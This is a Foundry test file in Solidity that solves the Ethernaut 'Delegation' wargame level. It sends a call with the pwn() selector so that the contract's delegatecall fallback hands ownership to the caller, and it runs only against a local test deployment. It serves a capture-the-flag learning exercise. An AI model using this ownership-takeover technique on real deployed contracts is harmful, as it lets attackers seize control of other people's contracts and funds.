pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Delegation/Delegation.sol";
import "../Delegation/DelegationFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
}

contract DelegationTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    DelegationFactory delegationFactory;
    address levelAddress;
    bool levelSuccessfullyPassed;

    function setUp() public {
        // Setup instances of the Ethernaut & DelegationFactory contracts
        ethernaut = new Ethernaut();
        delegationFactory = new DelegationFactory();
    }

    function testDelegationHack() public {

        // Register the Ethernaut Delegation level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(delegationFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(1 ether);
        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(address(0));

        // Set up the Level
        levelAddress = ethernaut.createLevelInstance(delegationFactory);

        // Cast the level address to the Delegation contract class
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        // Determine method hash, required for function call
        bytes4 methodHash = bytes4(keccak256("pwn()"));

        // Call the pwn() method via .call plus abi encode the method hash switch from bytes4 to bytes memory
        address(ethernautDelegation).call(abi.encode(methodHash));

        // Submit level to the core Ethernaut contract
        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));

        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelSuccessfullyPassed);
    }
}